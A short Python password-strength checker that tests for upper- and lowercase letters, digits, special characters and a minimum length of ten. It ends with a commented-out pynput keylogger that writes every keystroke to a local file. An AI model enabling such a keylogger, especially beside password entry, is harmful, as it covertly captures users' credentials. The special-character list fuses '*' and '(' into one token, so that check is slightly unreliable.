
def checkUpper(input):
    uppers = 0 
    upper_list = "A B C D E F G H I J K L M N O P Q R S T U V W X Y Z".split()
    for char in input:
        if char in upper_list:
            uppers += 1
    if uppers > 0:
        return True
    else:
        return False

def checkLower(input):
    lowers = 0
    lower_list = "a b c d e f g h i j k l m n o p q r s t u v w x y z".split()
    for char in input:
        if char in lower_list:
            lowers += 1
    if lowers > 0:
        return True
    else:
        return False

def checkNumber(input):
    numbers = 0
    number_list = "1 2 3 4 5 6 7 8 9 0".split()
    for char in input:
        if char in number_list:
            numbers += 1
    if numbers > 0:
        return True
    else:
        return False

def check_specialCharacters(input):
    specials = 0
    special_characters = "~ ! @ # $ % ^ &  *( ) _ + { } [ ] \ | ? > <".split()
    for char in input:
        if char in special_characters:
            specials += 1
    if specials > 0:
        return True
    else:
        return False

def checkLength(input):
    if len(input) >= 10:
        return True
    else:
        return False


def correctPassword(input): 
    upper = checkUpper(input)
    lower = checkLower(input)
    number = checkNumber(input)
    special = check_specialCharacters(input)
    length = checkLength(input)
    
    if checkUpper(input) and checkLower(input) and checkNumber(input) and check_specialCharacters(input) and checkLength(input):
        return True

    else:
        print ("Not an acceptable password, you are missing something!")
        if upper == False:
            print ("Password needs at least one upper-case character.")
        if lower == False:
            print ("Password needs at least one lower-case character.")
        if number == False:
            print ("Password needs at least one number.")
        if special == False:
            print ("Password needs at least one special character.")
        if length == False:
            print ("Password needs to be at least 10 characters in length.") 
    
password = input ("Enter password: ")
while not correctPassword(password):
    password = input ("Enter password: ")

print ("Exceptional Password!!!")
print ("Exiting program...")

##keys = []
##from pynput import keyboard
##def on_press(key):
##    f = open('keylog.txt','a+')
##    keys.append(key)
##    f.write(str(key) + " ")
##    f.close()
##with keyboard.Listener(on_press = on_press) as listener:
##    listener.join()
##
##
